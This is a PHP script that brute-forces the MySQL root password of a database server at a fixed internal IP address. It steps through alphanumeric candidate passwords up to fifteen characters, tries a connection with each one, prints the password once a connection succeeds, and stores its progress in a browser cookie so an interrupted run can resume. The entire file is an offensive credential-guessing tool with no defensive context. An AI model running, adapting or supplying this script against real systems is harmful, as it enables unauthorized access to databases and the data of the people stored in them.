<?php
    set_time_limit(0);
    class MysqlConnect {
        function connect($mysql_password) {
            error_reporting(E_ALL^E_NOTICE^E_WARNING^E_DEPRECATED);
            define("mysql_server_name", "10.28.102.142");
            define("mysql_username", "root");

            $mysqli = new mysqli();
            $mysqli->connect($mysql_server_name, $mysql_username, $mysql_password, 'H092214109');
            if (mysqli_connect_error()) {
                return null;
            }
            $mysqli->set_charset("utf8");
            return $mysqli;
        }

        function query($mysqli, $sqlStr) {
            $result = $mysqli->query($sqlStr);
            if ($result === false) {
                echo $mysqli->error;
                return null;
            }
            return $result;
        }

        function freeresourse($mysqli) {
            $mysqli->close();
        }
    }

    function getNextChar($char) {
        $intChar = ord($char);
        if ($intChar >= 48 && $intChar <= 57) {
            if ($intChar != 57) {
                $intChar++;
            } else {
                $intChar = 65;
            }
        } else if ($intChar >= 65 && $intChar <= 90) {
            if ($intChar != 90) {
                $intChar++;
            } else {
                $intChar = 97;
            }
        } else if ($intChar >= 97 && $intChar <= 122) {
            if ($intChar != 122) {
                $intChar++;
            } else {
                $intChar = 48;
            }
        } else {
            $intChar = 48;
        }
        return chr($intChar);
    }

    function getNext($str) {
        $i = 0;
        while(true) {
            if (!isset($str{$i + 1})) {
                break;
            }
            $i++;
        }

        $str{$i} = getNextChar($str{$i});
        while ($i != -1 && $str{$i} == '0') {
            $i--;
            if ($i == -1) {
                return null;
            }
            $str{$i} = getNextChar($str{$i});
        }
        return $str;
    }

    function exchange($begin, $length) {
        $mysql_password = $begin;

        do {
            $mysql_password = getNext($mysql_password);
            if ($mysql_password == null) {
                break;
            }
            $mysql_Connect = new MysqlConnect();
            $mysqli = $mysql_Connect->connect($mysql_password);
            if ($mysqli != null) {
                echo "Password is : $mysql_password .";
                exit;
            } else {
                #echo "| $mysql_password | NO <br/>";
            }
            setcookie("begin", $mysql_password, time() + 3600 * 10);
        } while (true);
    }


    $i = 0;
    if (isset($_GET['index'])) {
        $i = $_GET['index'];
    }

    if (isset($_GET['begin'])) {
        $begin = $_GET['begin'];
        $i = strlen($begin);
    } else if (isset($_COOKIE["begin"])) {
        $begin = $_COOKIE["begin"];
        $i = strlen($begin);
    }

    for (; $i < 15; $i++) {
        if (!isset($_GET['begin']) || isset($_GET['begin']) && ($i > strlen($begin))) {
            if ($i == 1) {
                $begin = "0";
            } else {
                $tempInt = 1;
                for ($j = 2; $j <= $i; $j++) {
                    $tempInt = $tempInt * 10;
                }
                $begin = (string)$tempInt;
            }
        }
        exchange($begin, $i);
    }

    /*
    echo ("<script type=\"text/javascript\">");
    echo ("function fresh_page()");    
    echo ("{");
    echo ("window.location.reload();");
    echo ("}"); 
    echo ("setTimeout('fresh_page()',1000);");      
    echo ("</script>");
    */
?>